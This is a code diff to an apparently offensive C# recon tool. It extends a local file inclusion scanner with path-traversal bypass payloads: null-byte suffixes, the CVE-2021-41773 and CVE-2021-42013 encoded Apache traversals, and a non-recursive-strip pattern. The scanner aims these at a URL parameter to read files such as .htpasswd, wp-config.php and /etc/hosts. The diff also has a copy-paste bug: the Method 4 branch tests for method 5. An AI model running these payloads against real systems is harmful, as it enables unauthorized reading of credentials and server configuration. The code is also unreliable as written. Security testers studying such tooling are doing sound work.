@@ -10,7 +10,8 @@ namespace Reecon
     {
         [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0044:Add readonly modifier")]
         private static WebClient wc = new();
-        private static string initialPart = "";
+        private static string baseURL = "";
+        private static string baseLocation = "";
         private static int notFoundLength = 0;
         private static int notFoundLength2 = 0;
         private static int bypassMethod = -1;
@@ -41,7 +42,9 @@ namespace Reecon
 
             if (OS == General.OS.Linux)
             {
-                List<string> webChecks = new()
+                Console.WriteLine("OS Detected as: Linux");
+                Console.WriteLine("Running additional checks - Please wait...");
+                List<string> linux_WebChecks = new()
                 {
                     // General web checks
                     "/var/www/html/.htpasswd",
@@ -52,16 +55,16 @@ namespace Reecon
                     "/var/www/html/wordpress/wp-config.php",
                     "/var/www/wordpress/wp-config.php"
                 };
-                DoLFI(webChecks);
+                DoLFI(linux_WebChecks);
 
-                // Do nginx checks
+                // Do nginx specific checks
                 List<string> linux_nginx = new()
                 {
                     "/etc/nginx/sites-available/default"
                 };
                 DoLFI(linux_nginx);
 
-                // Do Apache2 Checks - https://packages.ubuntu.com/eoan/all/apache2/filelist
+                // Do Apache2 specific checks - https://packages.ubuntu.com/eoan/all/apache2/filelist
                 List<string> linux_apache = new()
                 {
                     "/etc/apache2/sites-available/000-default.conf"
@@ -127,6 +130,7 @@ namespace Reecon
             }
             else if (OS == General.OS.Windows)
             {
+                Console.WriteLine("OS Detected as: Windows");
                 // Do IIS Checks
                 Console.WriteLine("LFI - Windows - Bug Reelix");
             }
@@ -146,6 +150,8 @@ namespace Reecon
         private static void InitialChecks(string path)
         {
             Console.WriteLine("Scanning: " + path);
+
+            // First, check to make sure that the initial version works
             HttpStatusCode statusCode = wc.GetResponseCode(path);
             if (statusCode != HttpStatusCode.OK)
             {
@@ -153,29 +159,35 @@ namespace Reecon
                 Environment.Exit(0);
             }
 
-            initialPart = path.Substring(0, path.IndexOf("=") + 1);
+            // Split the URL - Can't just split since the location could contain an =
+            baseURL = path.Substring(0, path.IndexOf("=") + 1);
+            baseLocation = path.Remove(0, path.IndexOf("=") + 1);
+
+            // Run checks to determine what an invalid path returns
+            Console.WriteLine("Determining invalid path results...");
             // NFL1
-            string result = Web.GetHTTPInfo(initialPart + "Reelix").PageText;
+            string result = Web.GetHTTPInfo(baseURL + "Reelix").PageText;
             notFoundLength = result.Length; // Check for cases where the page text contains the URL?
             // Some not-found pages can be blank
             if (notFoundLength < 0)
             {
                 notFoundLength = 0;
             }
-            Console.WriteLine("NFL1: " + notFoundLength);
+            Console.WriteLine("Invalid Path 1/2 Length: " + notFoundLength);
 
             // NFL2
-            result = Web.GetHTTPInfo(initialPart + "Ree..lix").PageText;
+            result = Web.GetHTTPInfo(baseURL + "Ree..lix").PageText;
             notFoundLength2 = result.Length;
             if (notFoundLength2 < 0)
             {
                 notFoundLength2 = 0;
             }
-            Console.WriteLine("NFL2: " + notFoundLength2);
+            Console.WriteLine("Invalid Path 2/2 Length: " + notFoundLength2);
         }
 
         private static General.OS GetOS()
         {
+            Console.WriteLine("Running OS Checks...");
             // Linux
             List<string> linuxChecks = new()
             {
@@ -184,6 +196,7 @@ namespace Reecon
                 "/var/www/index.php",
                 "/var/www/html/index.php",
                 "/etc/hostname", // Box Hostname
+                "/etc/hosts",
                 "/etc/issue", // Shows the Release
                 "/etc/group", // Groups
                 "/proc/self/cmdline" // Running commandline
@@ -238,6 +251,10 @@ namespace Reecon
             // Bypass Method 0: {PATH}
             // Bypass Method 1: /../../../../..{PATH}
             // Bypass Method 2: /../../../../..{PATH}%00
+            // Bypass Method 3: /../../../../..{PATH}%00.ext
+            // Bypass Method 4: CVE-2021-41773 - .%2e/.%2e/.%2e/.%2e/.%2e{PATH}
+            // Bypass Method 5: CVE-2021-42013 - %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65{PATH}
+            // Bypass Method 6: Non-Recursive Strip - /../.../...//../.../...//../.../...//../.../...//../.../.../{PATH}
 
             bool hasResult = false;
             foreach (string check in lfiChecks)
@@ -249,10 +266,12 @@ namespace Reecon
                 }
                 if (bypassMethod == -1 || bypassMethod == 0)
                 {
-                    string toCheck = initialPart + check;
-                    bool isLFI = TestLFI(toCheck, check, 0);
+                    string toCheck = baseURL + check;
+                    int bypassLength = 0; // No bypass
+                    bool isLFI = TestLFI(toCheck, check, bypassLength);
                     if (isLFI && bypassMethod == -1)
                     {
+                        hasResult = true;
                         bypassMethod = 0;
                     }
                 }
@@ -261,27 +280,101 @@ namespace Reecon
                 {
                     Console.WriteLine($"Testing: /../../../../..{{PATH}} with {check}");
                 }
-                else if (bypassMethod == -1 || bypassMethod == 1)
+                if (bypassMethod == -1 || bypassMethod == 1)
                 {
-                    string toCheck = initialPart + "/../../../../.." + check;
-                    bool isLFI = TestLFI(toCheck, check, 15);
+                    string toCheck = baseURL + "/../../../../.." + check;
+                    int bypassLength = "/../../../../..".Length;
+                    bool isLFI = TestLFI(toCheck, check, bypassLength);
                     if (isLFI && bypassMethod == -1)
                     {
+                        hasResult = true;
                         bypassMethod = 1;
                     }
                 }
+
                 // Method 2: /../../../../..{PATH}%00
                 if (bypassMethod == -1)
                 {
                     Console.WriteLine($"Testing: /../../../../..{{PATH}}%00 with {check}");
                 }
-                else if (bypassMethod == -1 || bypassMethod == 2)
+                if (bypassMethod == -1 || bypassMethod == 2)
                 {
-                    string toCheck = initialPart + "/../../../../.." + check + "%00";
-                    bool isLFI = TestLFI(toCheck, check, 18);
+                    string toCheck = baseURL + "/../../../../.." + check + "%00";
+                    int bypassLength = "/../../../../..".Length + "%00".Length;
+                    bool isLFI = TestLFI(toCheck, check, bypassLength);
                     if (isLFI && bypassMethod == -1)
                     {
+                        hasResult = true;
                         bypassMethod = 2;
+                    }
+                }
+
+                // Method 3: /../../../../..{PATH}%00.ext
+                if (bypassMethod == -1 && baseLocation.Contains('.'))
+                {
+                    Console.WriteLine($"Testing: /../../../../..{{PATH}}%00.ext with {check}");
+                }
+                if (bypassMethod == -1 || bypassMethod == 3)
+                {
+                    string ext = baseLocation.Remove(0, baseLocation.IndexOf(".") + 1);
+                    string toCheck = baseURL + "/../../../../.." + check + $"%00.{ext}";
+                    int bypassLength = "/../../../../..".Length + "%00.".Length + ext.Length;
+                    bool isLFI = TestLFI(toCheck, check, bypassLength);
+                    if (isLFI && bypassMethod == -1)
+                    {
+                        hasResult = true;
+                        bypassMethod = 3;
+                    }
+                }
+
+                // Method 4: CVE-2021-41773 - .%2e/.%2e/.%2e/.%2e/.%2e{PATH}
+                if (bypassMethod == -1)
+                {
+                    Console.WriteLine($"Testing: .%2e/.%2e/.%2e/.%2e/.%2e{{PATH}} with {check}");
+                }
+                if (bypassMethod == -1 || bypassMethod == 5)
+                {
+                    string toCheck = baseURL + ".%2e/.%2e/.%2e/.%2e/.%2e" + check;
+                    int bypassLength = ".%2e/.%2e/.%2e/.%2e/.%2e".Length;
+                    bool isLFI = TestLFI(toCheck, check, bypassLength);
+                    if (isLFI && bypassMethod == -1)
+                    {
+                        hasResult = true;
+                        bypassMethod = 4;
+                    }
+                }
+
+                // Method 5: CVE-2021-42013 - %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65{PATH}
+                if (bypassMethod == -1)
+                {
+                    Console.WriteLine($"Testing: %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65{{PATH}} with {check}");
+                }
+                if (bypassMethod == -1 || bypassMethod == 5)
+                {
+                    string toCheck = baseURL + "%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65" + check;
+                    int bypassLength = "%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65".Length;
+                    bool isLFI = TestLFI(toCheck, check, bypassLength);
+                    if (isLFI && bypassMethod == -1)
+                    {
+                        hasResult = true;
+                        bypassMethod = 5;
+                    }
+                }
+
+                // Method 6 - Non-Recursive Strip - /../.../...//../.../...//../.../...//../.../...//../.../.../{PATH}
+                if (bypassMethod == -1)
+                {
+                    Console.WriteLine($"Testing: /../.../...//../.../...//../.../...//../.../...//../.../.../{{PATH}} with {check}");
+                }
+                if (bypassMethod == -1 || bypassMethod == 6)
+                {
+                    string toCheck = baseURL + "/../.../...//../.../...//../.../...//../.../...//../.../.../" + check;
+                    int bypassLength = "/../.../...//../.../...//../.../...//../.../...//../.../.../".Length;
+                    bool isLFI = TestLFI(toCheck, check, bypassLength);
+                    if (isLFI && bypassMethod == -1)
+                    {
+                        hasResult = true;
+                        bypassMethod = 6;
                     }
                 }
             }
@@ -333,6 +426,13 @@ namespace Reecon
                             Console.WriteLine("----> " + line);
                         }
                     }
+                }
+            }
+            else if (check == "/etc/hosts")
+            {
+                if (pageText.Contains("Kubernetes-managed"))
+                {
+                    Console.WriteLine("-- Kubernetes Detected (And Confirmed by secondary testing)");
                 }
             }
             else if (check == "wp-config.php")
